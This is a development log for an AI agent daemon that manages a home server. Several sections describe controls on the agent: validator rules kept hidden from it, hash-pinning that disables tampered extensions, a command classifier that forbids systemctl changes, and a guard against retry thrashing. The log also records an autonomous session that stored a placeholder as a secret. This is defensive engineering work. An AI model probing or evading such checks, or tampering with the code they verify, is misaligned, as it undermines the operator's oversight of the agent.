- The turn-execution pattern was NOT a real change: Miro's `runTurn` already used `subscribe()` + `prompt()` + `waitForIdle()`, and the `AgentEvent` union kept the same event names and payload fields. `TurnHooks` needed no rework. What did change: `getApiKey` now receives the `Model` (not a provider string); `agent.state.tools = ...` became `agent.setTools(...)`; `streamSimple` is a free function (and agent-core's default `streamFn`); `shouldStopAfterTurn` is gone, replaced by `limitTurns()` (`agent/model-utils.ts`) over agent-core's `beforeModelCall` gate (`{stop: true}` refuses call N+1 - same budget, ends cleanly with no open turn and nothing billed); `ThinkingLevel` is `Effort` (a `const enum`, so `Effort.Medium`, not `"medium"`).
- `builtinModels` had no replacement to rename to: the vendored catalog is a static per-provider lookup (`getBundledModels`) with no registry object and no runtime "add a provider" API. `agent/models.ts` (~40 lines) is the Miro-owned `ModelRegistry`: bundled models + a runtime-added provider (Ollama, via `buildModel(spec)` since a `Model` now carries catalog-derived fields like `identity`) + the per-request credential lookup (stored key, env, or an OAuth access token). One instance per daemon, handed to every worker/learning agent - the same "must be the shared registry" finding from Stage C slice 1 still applies, now for the credential too.
- `codex-auth.ts`: pi-ai's `CredentialStore` contract is gone. The vendored openai-codex provider takes the OAuth access token as its plain `apiKey` (account id decoded from the token itself), and `refreshOAuthToken()` does the round-trip; Miro's part is durable storage - the same encrypted `secrets.ts` blob at the same `oauth.openai-codex` ref, so the VM's existing login survived the migration unchanged. Refresh happens in `getApiKey` when the stored `expires` is within 5 minutes, single-flighted.
- **Schemas:** `Type` now comes from `@miro/schema-engine/typebox`, omp's TypeBox-compatible shim over its ArkType-style engine (an `exports` map entry added; `@miro/sdk` re-exports it for generated extensions). Every `Type.Object/String/Optional/...` call site is unchanged. Two things were NOT compatible and both would have failed silently: (a) `Type.Unsafe(raw JSON Schema)` - the shim documents that it "cannot honestly implement that contract" and returns `unknown`, so the project's 9 enum fields would have reached the model with no constraint at all. `Type.Enum([...])` emits exactly the plain `{ type: "string", enum: [...] }` shape the AGENTS.md convention requires - verified by printing the real wire schema through `toolWireSchema` before touching any call site. (b) A schema is no longer a plain JSON object (it is a callable carrying `toJsonSchema()`), so `Type.Object(...)` written by a generated extension would have been lost the moment the host serialized it for the manifest. `extensions/declarative.ts`'s `entryParameters` is the one choke point and now converts with the same `toJsonSchema` options agent-core uses for the wire.

**Two hardforks of vendored code (the user's standing "hardfork anything that gives us a problem" license), each marked in place:**
- `packages/native` - **this resolves §5.17/§5.18's open "native crate scope" decision without building the crate.** The loader threw at IMPORT time when the `.node` file was missing, and `agent-core/src/tokenizer.ts` imports the package at module level, so every `new Agent(...)` died on this dev Mac and on the VM. `native/fallback.js` + a try/catch in `native/index.js`: a missing addon now yields bindings that throw a `NativeUnavailableError` on USE (call or construct), never on import; the enums index.js exports were already plain JS objects. `tokenizer.ts` treats that error like an unknown encoding and takes its own byte-estimate path (what omp uses for unknown models anyway). ponytail: approximate token counts → approximate compaction thresholds; upgrade path is dropping a built `pi_natives.<platform>.node` into `packages/native/native/` with no code change. Nothing else on Miro's runtime path calls the addon (`FileLock`/`Process` in agent-sys and the snapcompact PNG renderer are reachable only from omp host features Miro does not use).
- `packages/schema-engine` - two `Bun.FormDataEntryValue` references became the DOM lib's identical `FormDataEntryValue`: the extension validator's tsc program (`extensions/validate.ts`, deliberately minimal compiler options) compiles this surface through `@miro/sdk` without bun-types, and the reference extension stopped typechecking. Changing the vendored type is smaller and more robust than teaching the validator where bun-types lives on every host.
- Also: `apps/mirod/src/text-assets.d.ts` - the same cross-package ambient-declaration gap §5.17 hit for agent-core, now for the app that consumes three packages with `.md` prompt imports.

**Live verification on the dev VM (real daemon as root, real Codex login, real Jellyfin container), which found one real bug and proved one path unit tests cannot:**
1. First chat turn after the migration failed at OpenAI with `Invalid type for 'tools[28].parameters': expected an object, but got a boolean instead.` Independently read from the provider's own 400-request dump on the VM: every no-argument EXTENSION tool (`ext_gotify_health`, `ext_jellyfin_system_info`, ... 9 of 46 tools) had `parameters: true`. Cause: their manifests store a bare `{}` for "no arguments", which is a valid JSON Schema meaning "anything", and the vendored wire normalizer legitimately collapses that to the boolean `true` - which the tools API rejects. Miro's own `Type.Object({})` tools were fine (the shim emits `type: "object"`). Fix (commit `3aba96e`): `objectSchema()` spells a no-arg tool as `{ type: "object", properties: {} }` both where a manifest is written and where one is read (`agent/extension-tools.ts`), so the Gotify/Jellyfin extensions promoted before the fix keep working without re-learning. Re-driven: the same turn completed - `gpt-5.6-luna`, two real tool calls in parallel (`host_info`, `storage_mounts`), 213 chars streamed = final, correct hostname/uptime/disk. Then an extension turn: `ext_jellyfin_list_media_libraries` + `ext_jellyfin_system_info` ran through the extension host (which now loads `@miro/sdk` → the schema-engine shim in the unprivileged `miro` process) and returned real data (10.11.11, TV Shows + Movies).
2. **The Codex OAuth refresh path** - the code that keeps the daemon working past the token's expiry - was NOT exercised by those turns: decoding the stored token's JWT claims from the real DB showed it was issued 2026-09-01 and valid to 2026-09-11. So it was forced: the stored `expires` rewritten to the past (blob backed up to a root-only file first, deleted after), then a turn. First attempt: `That request failed: Timed out waiting for https://auth.openai.com/oauth/token` at 15s (`TOKEN_REQUEST_TIMEOUT_MS` in the codex provider; a bare `curl` POST to that endpoint from the VM measured 1.7s once and 10s the next time - the VM's SLIRP network, not the code). The stored credential was left untouched by the failure (correct), the error surfaced as the reply, and the next turn retried: refresh succeeded, the stored blob rotated (issued 2026-09-04T23:10Z, new 10-day expiry, gained the `email` the profile hook adds), the turn replied `ok` in 6s. Verified by decoding the stored token again, not by trusting the log.
   - Follow-ups worth doing, not done: return an `ApiKeyResolver` from `getApiKey` so a transient refresh failure retries inside model-client's own auth-retry policy instead of failing the turn once; a fresh Codex login now needs `loginOpenAICodexDevice()` from the vendored client (the `codex-auth-import.json` drop-file path in `index.ts` assumed pi-ai's CLI, which no longer exists) - a §5.16-adjacent login UX item.
3. Hot-load of freshly-learned tools mid-task (§5.4 D) still holds by construction: agent-core re-reads `state.tools` before every model call (`agent.ts:1445`), so `setTools()` from `onPromoted` is visible from the next call on. Not re-driven live this session (would need a full learn run); the mechanism is a code-level fact, recorded as such.

**State:** 13/13 packages typecheck (`just check` now covers every package with a tsconfig, not 4). Full suite 289 pass / 0 fail / 14 skip. The pi-ai faux provider in tests is replaced by model-client's `createMockModel`; `spawnWorker` is now tested directly against a scripted model (it no longer needs a real key). Of §5.18's queued decisions: the migration is done, the native crate is resolved by the fallback (build it only when a call site needs exact tokenization or a native lock), and the agent-loop-blocked units (undo-then-retry, model-tier gating, the termination gate) are unblocked. Structured validator failures remain queued as before.

### 5.20 Self-extension assurance: structured failures, the regeneration budget, dead-app admission, hash-pinned promotions (2026-09-04/05)

Branch `agent-assurance` (stacked on `migrate-agent-loop`, PR #4). The user's "do it" on the list at the end of §5.19; executed in value order, each unit committed green and live-verified on the dev VM. Commits `500b214`, `4371e98`, `89a7c96`.

**Codex login as an `ApiKeyResolver` (`agent/codex-auth.ts`).** The model client's own a/b/c auth-retry policy now drives the credential: on a 401 it asks once for the same credential refreshed and once for a sibling account (none), instead of a rejected token failing the turn. The refresh round-trip itself retries once after a transient failure - the §5.19 live finding. Tested against a real `:memory:` DB and a real encrypted store with only the network call injected (9 tests: skew, forced refresh on rejection, single-flight, two failures leave the stored credential untouched).

**Structured validator failures (`extensions/validate.ts`).** `ValidationResult.failures` is `{ entry, field, rule, message, fix, example }`, ordered by the REST→MCP failure taxonomy (auth scheme → base URL → headers → param types → rest; stable within a rank) so the model fixes the failure that makes the others unobservable first. `extension_write` returns the objects verbatim; `formatFailure` renders the log line. The hints gained `example`s and two new entries (401/403 → auth scheme + prefix; ECONNREFUSED/404 → base URL).

**Repair budget reshaped (`extensions/learn.ts`, `learn-agent.ts`).** One write plus ONE targeted repair per session (was three chained attempts on one draft in one context), and `runLearnFlow` runs up to `MAX_REGENERATIONS = 3` independent sessions, the next seeded with the last draft verbatim plus its structured failures as the same JSON objects. A session that never wrote is not regenerated (no draft to seed; a fresh sample would only redo research). A repair session is seeded with the LIVE `extension.ts` the same way - the repair agent could never read it before, because the extensions directory is refused to every read tool as Miro's own state.

**Dead-app admission check.** A code diagnostic that still succeeds against a URL nothing answers on (`http://127.0.0.1:9`) does not observe the app - it would report a dead app as healthy forever. Probed in a throwaway host session (`ExtensionHostManager.probe`: live sessions are keyed by dir and keep their first `baseUrl`, found while building it). Declarative reads cannot pass this by construction and are skipped; `HostToolSpec.impl` ("read" | "code" | "bind", set by `entrySpec`) records which is which. The contract this makes explicit, now in the learn prompt: a diagnostic observes the app through its baseUrl and signals a problem by THROWING (the daemon treats any returned value as healthy); a container/process/file check is a `tool`.

**Hash-pinned promotions (`extensions/pin.ts`, "hide the judge").** `extension.ts` + `manifest` are sha256'd at promotion (`extensions.content_hash`, defensive `ALTER TABLE`) and re-checked before every host call, every operation bind, every re-probe and every repair. A mismatch disables the extension - never repaired into trust, because the validator never saw what is on disk now. Rows promoted before pinning existed are pinned as they stand on first use. `MIRO_DIR` (`/var/lib/miro`, `~/.miro`) was already refused to every generic read/write kind, so `extension_write` cannot reach the validator's rules or another extension's files through an operation either.

**Live verification on the dev VM (real daemon, real Codex, real Jellyfin container), in order:**
1. **A real regression found by the first re-learn, and its root cause.** Asked to re-learn Jellyfin, the loop ran for real - three independent sessions, six structured failures reaching the model (`[probe] reachable: live probe failed: Jellyfin system endpoint returned HTTP 401` every time), the "attempt N of 3 did not validate - starting a fresh attempt from its draft" notices - and did NOT promote, where the same app promoted in one attempt in §5.13. The last draft (still in `jellyfin.staging/`) showed why: every code entry passed `Authorization: "MediaBrowser Token={{secret:extension.jellyfin.session_token}}"` as a header to `ctx.http.get`, and the extension host's HTTP client never substituted `{{secret:...}}` placeholders - only the daemon's declarative bindings did - so the literal placeholder went on the wire. The model had abandoned declarative `auth: { header, secret }` because Jellyfin's `Authorization` header needs a scheme word in front of the token, which `auth` could not express - exactly the taxonomy's "undocumented auth prefix" bucket - and the failure text could not tell it either. The seeded regenerations dutifully repeated the mistake, which is the expected shape when the failure cannot discriminate: the reshape worked, the signal did not exist yet. Fix (commit `89a7c96`): `createHttpClient` substitutes placeholders in path/query/per-call headers from the host's secrets (an unknown ref throws naming the ref, tested against a real local server), `AuthSpec.prefix` ("Bearer ", "MediaBrowser Token="), and the prompt + 401 hint teach both.
2. **After the fix, the same re-learn promoted in ONE attempt:** v2, 5 tools, 1 diagnostic (`reachable`, impl `code` - so the dead-app probe ran against it for real and it correctly fails when the app is unreachable), 2 operations, `content_hash` set. The model chose `X-Emby-Token` declarative auth. Independently read from the DB, not the reply.
3. **Tamper test.** A first `ext_gotify_health` call pinned the pre-existing Gotify extension as it stood (`content_hash` went from NULL to set); one line appended to its `extension.ts` on disk; the next call returned `refused: extension "gotify"'s code on disk does not match what was validated and promoted - disabled` and the row read `state=disabled`, `last_error=content hash mismatch: extension.ts/manifest changed after promotion`.
4. **Side finding, not yet fixed:** Gotify's stored `X-Gotify-Key` secret holds the literal string `[no user available — decide yourself or stop]` - an earlier autonomous repair session stored the no-user marker `ask_user` returns as if it were a credential. The marker must never be storable as a secret value.

**State:** 306 pass / 0 fail / 14 skip; every package typechecks. Still open from §5.15: the agent-loop units (termination gate, undo-then-retry, model-tier gating) - next; Prodtest per repair; the Codex login UX (`loginOpenAICodexDevice`).

### 5.21 The turn guard: thrash blocking, the done-without-commit gate, undo-then-retry, model-tier limits (2026-09-05)

Same branch (`agent-assurance`, PR #5), commit `eec90ec`. §5.15 A/B's agent-loop items, the ones §5.18 called "genuinely blocked on the migration" - built the day after it landed.

- **Undo-then-retry ledger (`operations/retry-ledger.ts`, consulted inside `runOperation`).** The engine already restores s_pre on every failure; STRATUS's number is about what happens NEXT - retrying the same plan from the restored state mitigates 23% vs 69% for undo-and-retry-differently. A plan is hashed (kind + key-order-independent params); an identical plan that already rolled back this turn is refused before anything is planned, asked or recorded (no operation row, no confirmation prompt), and past the turn's cap every further plan is refused with the trajectory to report. A user cancellation is not a failed plan. Lives on `OperationToolContext.retries`, so extension operations and a learning session's operations (same context, same task) count toward the same turn.
- **Turn guard (`agent/turn-guard.ts`).** Two agent-core hooks the migration made available: `beforeToolCall` blocks the Nth identical tool call (same tool, same arguments) in a turn - the model sees a tool error naming the repetition; `setOnTurnEnd` + `followUp` turn a turn that attempted operations and committed none into ONE follow-up user message carrying the trajectory and demanding a genuinely different plan or an honest report. State-based, no NLP on the reply (ponytail: it also fires on a turn that already reported failure honestly, costing one short model call). `agent_start` resets everything, including the ledger, so "this turn" means the same thing in both places.
- **Model-tier limits.** `modelTier(model)`: a local or zero-cost model is "weak" (2 identical calls, 2 failed plans), a billed one "strong" (3/3) - the signal routing already has; a catalog tier is the upgrade path. The maturity ladder has no autonomy to gate yet (`maturityOf` is display-only today), so tier gating starts where the failure modes are: thrashing and blind retries.
- **The no-user marker is unstorable** (`NO_USER_ANSWER`): `ask_user` and `secret_store` refuse it as a credential value - the §5.20 side finding.

**Tested with a real Agent over scripted models** (the loop's own hooks, not a reimplementation): third identical call is a tool error the model sees, count resets per prompt, the follow-up carries `flaky_op: Verification failed` and fires once, a committed operation or a read-only turn never triggers it; the engine refuses an identical plan without describing it and runs a different one. 319 pass / 0 fail.

**Live on the dev VM**, asked to run `systemctl restart jellyfin-media.service` as an operation and, if it fails, run the exact same command again: the first operation planned, was approved, applied and failed (`Failed to connect to system scope bus via local transport` - `systemctl` cannot reach systemd's bus from inside the sandbox; `service_restart` is the kind for this, the prompt forced `shell_command`), rolled back; the identical second call came back `Refused - this exact plan already failed this turn` with no plan and no confirmation prompt; the daemon logged `turn guard: 2 operation(s) attempted, none committed - demanding a different plan or an honest report`; the final reply opened with "The task was not completed" and named the guard. Streamed 795 chars vs a final 445: the client streamed the pre-gate reply too. Checked, not assumed: `@miro/ui-model`'s `reply` reducer already treats the final text as authoritative and replaces the streaming block with it, so the only effect is a transient flash of the first reply while the corrected one streams - acceptable, nothing to change.

### 5.22 Codex login from the daemon: the device-code flow behind /provider (2026-09-05)

Same branch, commit `6d01781`. The §5.19 follow-up: a fresh Codex login used to depend on pi-ai's CLI having written `codex-auth-import.json` for the daemon to import, and that CLI is not vendored - so there was no way to connect Codex on a new box. Now `/provider` offers "OpenAI Codex (ChatGPT login, no API key)" next to the key providers (deliberately NOT a `PROVIDER_CATALOG` entry - those mean "a stored/env key connects it"; Codex is connected when its OAuth blob is on file). Choosing it runs the vendored client's `loginOpenAICodexDevice` inside the daemon (`loginCodex` in `agent/codex-auth.ts`; one named re-export added to the vendored oauth registry index): the owner gets ONE notice - open `https://auth.openai.com/codex/device`, enter the code - the flow polls for the browser authorization detached from the connection (up to ~16 minutes; a notice that cannot be delivered to a closed connection is logged, never thrown), and on success the credential lands in the same encrypted blob the resolver reads, so the next turn uses it and the status line updates. The drop-file import stays for anyone who still has one.

**Live on the dev VM** (a driver connecting like the TUI: `provider_setup` → answer `openai-codex`): the choice list shows all five, the reply says the login is starting, and 0.7s later the notice carries the real URL and a real one-time code from OpenAI's device-auth endpoint; the daemon log shows the poll waiting. The browser step needs a human, so the check stops there by design - the token exchange and storage after it are the same `OAuthCredentials` shape the resolver already round-trips (§5.19's forced refresh proved that path against the real endpoint).

### 5.23 systemd.unit: every unit change is an operation, and systemctl is refused as a sandboxed command (2026-09-05)

Same branch, commit `8881c10`. Follow-up to the §5.21 live finding, investigated rather than filed: `service_restart` (the `systemd.restart` kind) was never affected - it runs `sudo systemctl` in the daemon's own namespace. Only a `shell_command` carrying `systemctl` failed, and it always will: `operations/sandbox.ts` gives the command its own PID namespace on purpose (no host process's environ is readable from inside), and systemctl refuses to talk to PID 1 from another PID namespace - that is what "Failed to connect to system scope bus via local transport" means. Sharing the PID namespace for systemctl would give up the property, so the answer is the same shape restarts already had.

- **`operations/kinds/systemd-unit.ts`** (`systemd.unit`, tool `service_control`): start / stop / enable / disable a unit, or daemon-reload after writing a unit file. Runs `sudo systemctl` unsandboxed like `systemd.restart`, with the engine's full contract: capture = active + enabled (`getUnitEnabled` added to `inventory/systemd.ts`), a per-verb verify with a 5s window, rollback restores the captured state; stop/disable of a lifeline-adjacent unit (`LIFELINE_ADJACENT`, now shared with the restart kind) is a `lifeline` operation; daemon-reload never rolls back (the files are what they are). Unit names are argv, never a shell, so the name check is a sanity check that names a model mistake early, not an injection guard.
- **Classifier:** every `systemctl` change is `forbidden` as a shell command, with `alternativeFor` pointing at `service_restart` / `service_control`; reads stay reads. The adversarial-review catalogue cases for socket units and flag-value tricks move from `lifeline` to `forbidden` - stricter, same guarantee (never a silent mutate). The system prompt and the capabilities context name the new tool.

**Live on the dev VM:** "stop miro-demo.service, then start it again" → two `systemd.unit` operations, both planned with the real current state (`currently active, enabled` → `currently inactive, enabled`), both auto-approved as `mutate`, both `committed` after verify; `systemctl is-active` = `active` afterwards, and the two rows read `committed` in the daemon's DB. Then `systemctl enable cron` as a shell_command → `{ refused: true, reasons: ["systemctl: ..."], alternative: "systemctl cannot change anything from inside the command sandbox ... service_control" }`, nothing planned.

### 5.24 Prodtest per repair: drift detection from the verifies Miro already has - and what a verify is not (2026-09-05)

Same branch, commits `6af787f` + `7743e9b`. The last §5.15 A engine-assurance item ("every committed repair leaves its re-runnable verify; Dreaming re-runs them; recurrence escalates instead of retrying"), after Google's Prodtest - a test paired with the fix, because automation dies when nobody keeps it in sync.

**Mechanism (`operations/prodtest.ts`).** Every committed operation already stores the params of the read-only `verify` that proved it worked (a shell verify runs in a read-only sandbox, an http verify GETs, the systemd and file kinds observe state). `reverifyCommitted` re-runs the LATEST committed operation per target - `OperationKind.prodtest(params)` names the target (a path, a unit, `unit#enabled`, a URL) so a later change to the same thing supersedes an earlier one instead of contradicting it - and a failure becomes a drift incident under the operation's own incident key (`incident.<kind>.<goal>`), so recurrence reinforces the same record and the agent's context reads "seen N times". Escalation, not a retry: nothing is ever re-applied. Wired to the same 24h idle timer as the extension re-probe. Tested through the real engine (latest-per-target, drift after a post-commit change, reinforcement, `prodtest` null, an unregistered kind, a throwing verify).

**What the first live pass taught, and the correction.** Run against the dev VM's real history (the Jellyfin setups of Sep 2 plus today's operations): the induced case worked - `systemctl stop miro-demo.service` behind Miro's back came back as drift for "Start miro-demo.service", and cleared after the unit was started again - but 8 of the Sep 2 operations came back as drift too, every one a step's post-condition re-run as if it were an invariant: `verifyExpect: "StartupWizardCompleted":false` (true only while the wizard is open; three of them), a `Movies2` / `TV Shows2` / `[]` check on `/Library/VirtualFolders` (transient states of a rename sequence; those were saved by latest-per-target, the wizard ones were not because each POSTed a different URL). **A verify proves a step worked; it is not, by default, a property to keep.** Correction (`7743e9b`): the state-based kinds (file content, file absence, unit state) stay re-verifiable by construction; `shell_command` and `http_mutation` take `verifyKeeps: true` for a check the planner asserts should keep holding (the tool descriptions say when: "a mount is read-only, a library exists with this path" vs "the wizard is still open, a temporary name exists"), and only those are re-run; `file_write` is lasting by default with `verifyKeeps: false` for a one-shot marker the app consumes - the one remaining flag after the correction was exactly that, Jellyfin's password-recovery marker, which Jellyfin reads and deletes. Extension bindings (`@miro/sdk`) can declare it the same way. After the correction the pass checks 3 operations on the VM, reports drift only when induced, and is clean after the restore; the 20 false incident rows the first pass wrote were removed with the store's own `forget()`.

**State:** 325 pass / 0 fail / 14 skip; every package typechecks. §5.15 A/B's engine-assurance checklist is now complete except the two that need a design decision first (reboot lifeline via boot assessment; managed-facts ledger + drift-as-plan, which this unit is the observation half of). Next is the §5.14 capability/provider architecture (Slice 1: registry, router, own `web.search`, quota, 3-tier egress).

### 5.25 Capability layer, slice 1: registry + router + web.search, Brave gone (2026-09-05)

Branch `capability-web-search` (stacked on `agent-assurance`, PR #5), commit `f7e88ed`. §5.14's revised slice 1, built on the vendored packages the way §5.14 designed it for, with one deliberate narrowing and two measured facts.

**Built (`apps/mirod/src/capabilities/`).**
- `registry.ts`: `Capability` (dotted id, `isGood(result)` - what counts as an answer), `Implementation` (id, capability, provider key for usage, `meta.auth`/`meta.cost`, `available()` re-asked on every route so a key added mid-session counts, `run(req, signal)`, per-impl timeout), `Policy` = groups in order with a fan-out within a group (`fixed`, ordered fallback and a parallel pool are all one shape), `Registry.route()`: first GOOD result of a group wins and aborts the rest, an empty answer from a healthy node is recorded as healthy but is not an answer, per-implementation timeouts inside a 12s total budget, every outcome recorded against its provider, cooled and unavailable providers skipped, candidates ordered by health at most `FANOUT_WIDTH` (3) wide. `toolNameOf` enforces the Codex tool-name pattern on the dotted id. `ImplementationError(status, resetAt)` is how an HTTP failure reaches the usage store.
- `usage.ts`: `capability_usage` in bun:sqlite (the `operations/store.ts` shape): requests, failures, consecutive failures, last 429, cooldown-until, EWMA latency, last ok, and `remaining` tagged known / estimated / unknown (unknown until a provider says; nothing pretends). A 429 cools until the provider's reset header or 15 min; 3 consecutive failures cool 5 min; an ok clears. `score()` = success rate × a latency discount × a staleness discount, an even prior for the untried.
- `web-search/`: the normalization from the earlier draft (provenance kept, URL-deduped, position prior, score-merge), `ollama` (POST `ollama.com/api/web_search`, Bearer key from `provider.ollama` - pasted via `/provider`'s new "Ollama cloud (web search key)" choice; `OLLAMA_API_KEY` env as fallback), `searxng.selfhosted` (setting `searxng.base_url` / `SEARXNG_URL`; slice 2's docker operation will write it), `searxng.public:<host>` built from a pool. Policy: `[["ollama"], ["searxng.selfhosted"], ["searxng.public:*"]]`. `searchWeb` returns results, the winning source and every attempt - provenance the agent quotes. `configureCapabilities` at boot; `refreshWebSearchPool` on the 24h idle timer and once at boot.
- Brave: `inventory/web.ts` deleted, `BRAVE_API_KEY` gone; AGENTS.md's gotcha rewritten.

**Measured before designing the pool, not assumed.** Every instance on searx.space (79 healthy of 92) probed for real `format=json` support from this Mac: 59 answer 429 (SearXNG's bot limiter blocks JSON by default), 6 answer 200 with HTML (JSON disabled), a handful 403/418, and **two** answer JSON (`search.mectov.my.id`, `sx.xo.st`). searx.space's data does not say which support JSON, so the pool is discovered by probing (bounded concurrency, 8s per node, fastest first, at most 8 kept, cached in a setting) and re-probed daily; those two are the bundled seed. The public pool is a last resort that keeps itself fresh, not the "3-tier egress" the earlier plan text imagined.

**Narrowed on evidence: provider-native hosted search is out of this slice.** The vendored model client's hosted-tool marker (`Tool.native`) knows only `computer`; its Anthropic adapter's `web_search` builtin list is a name-prefix exemption, not a way to request the tool; OpenAI/Codex have no request-side hosted search at all. So there is no native `web.search` implementation to register until that is built into the vendored client - a later unit, designed for by the `Implementation` shape (a hosted impl declares no client `run`).

**Tests:** a real `Registry` over a real usage store with scripted implementations (group order, empty-is-not-an-answer, first-good fan-out with the losers aborted and not recorded, per-impl timeout, 429 cooldown and unavailable skipped, candidate ordering and width, unregistering a family); the usage store's rules and persistence; the parsers and merge; the Ollama and SearXNG implementations, `searchWeb`'s routing order and the pool refresh against a real local HTTP fixture server. 341 pass / 0 fail.

**Live on the dev VM:** `web_search` for "jellyfin intel quick sync hardware transcoding debian" with no Ollama key and no self-hosted node → served by `searxng.public:sx.xo.st` (first good of the two-node fan-out), 10 results, first hit `jellyfin.org`; the boot refresh probed searx.space from the VM and installed the same two nodes. The Ollama implementation is verified against the fixture server only - no cloud key is available to me; the request/response shape is the one §5.14 documented.

**Not in this slice, by the plan:** `web.fetch`, the self-hosted SearXNG docker operation (slice 2), extension-declared implementations and provider metadata in the `capabilities` tool (slice 3), a merge fan-out mode (`mergeDedup` is the upgrade path once two sources answer one route).

### 5.26 Capability layer, slice 2: web.fetch, the self-hosted SearXNG operation, hash-anchored file edits (2026-09-05)

Same branch (`capability-web-search`, PR #6, now slices 1+2), commits `15fb2c0`, `eb04ae0`, `daf58e5`. Every unit live-verified on the dev VM the same day, each with a finding.

**`web.fetch` (`capabilities/web-fetch/`, tool `web_fetch`).** A public page as readable text - title, content, links - for reading what a `web_search` turned up. Two implementations on the same router: Ollama cloud's `web_fetch` when a key is on file, else a direct fetch with an extraction of our own (block boundaries become line breaks, script/style/navigation chrome dropped, entities decoded, links made absolute from the same stripped body so a navigation bar's links do not leak in; a 1MB read cap and a 20k-char default answer, truncation reported). Public URLs only: a local or private address is refused with the pointer to `http_get`, which carries credentials by reference and this never does. **Live finding:** the first fetch of jellyfin.org's hardware-acceleration URL came back empty - the URL answers 200 with a 448-byte JavaScript stub (`window.location.href = '/docs/general/post-install/...'` plus a `<link rel="canonical">`) and the real page is 40KB behind it. The direct implementation now follows client-side redirects (a meta refresh, a canonical link that differs from the page's own URL, a plain JS location assignment) when the extracted body is empty, at most three hops, never a `javascript:` target; the re-run returned the real page (`direct`, "Hardware Acceleration | Jellyfin", first sentence quoted, not truncated).

**`searxng.install` (tool `searxng_install`).** The local SearXNG that makes `web_search` reliable, as a confirmed docker operation (ask-first): a settings.yml with JSON output ON and the bot limiter OFF - the two SearXNG defaults that empty the public pool (§5.25) - `docker run` bound to `127.0.0.1:<port>` only with the data dir mounted at `/etc/searxng`, verify = the node answers `format=json` with a results array within 90s, rollback = container removed and a data directory this operation created moved to the trash. Runs `docker` in the daemon's namespace like the systemd kinds. A commit writes the `searxng.base_url` setting the self-hosted implementation reads, through the new `OperationToolContext.setSetting`; Prodtest target = the container keeps answering. **Live:** the image was pulled in the background beforehand (256MB, a few minutes on the VM's link); the chat turn planned it (`writes: [/var/lib/miro/searxng, /var/run/docker.sock]`, `network: true`, the pull warning), the driver approved, apply + verify took 6s, committed; `docker ps` showed `miro-searxng` on loopback, a raw curl of the JSON endpoint returned real results, the setting row read `http://127.0.0.1:8888`, and the next `web_search` was served by `searxng.selfhosted` (first hit: the Intel HWA tutorial - a better result than the public node's).

**Hash-anchored file edits (`operations/hashline.ts`, `operations/kinds/file-edit.ts`, tools `read_file(anchored)` + `file_edit`).** §5.14's "hashline" - omp's is Rust-backed in the addon Miro does not build, so this is Miro's own, ~90 lines: `read_file` with `anchored: true` tags every line `N:hhhh|text` (line number + a 4-hex sha1 of the line; anchors hash the REAL line so an edit to a redacted line still matches, and the tags survive redaction because they sit before the text the regexes look at); `file_edit` takes replace / insert_after / delete ranges named by those anchors, applied bottom-up so anchors stay valid, overlaps refused. The tool computes the edited content and passes it in the params, so verify, crash reconciliation and Prodtest work from the stored params alone; `describe()` re-derives the content from the file as it is NOW and refuses a stale view with the current tag ("read it again") instead of guessing; the owner approves a unified diff; rollback restores content and mode. The system prompt sends every existing-file change here - "never a retyped config" - and keeps `file_write` for creation. **Live:** asked to change a unit file's Description through the anchored path and then `daemon-reload`: the anchored read, a plan whose approval surface was the real diff (`replace 2:e9dd..2:e9dd`, `164 → 149 bytes`), approved, committed; `service_control daemon-reload` committed; `systemctl show -p Description` read the new text; both rows committed in the DB.

**State:** 353 pass / 0 fail / 14 skip; every package typechecks. Slice 3 next (extension-declared implementations, provider metadata into context and the `capabilities` tool); then Stage D's app set on top of all of it.
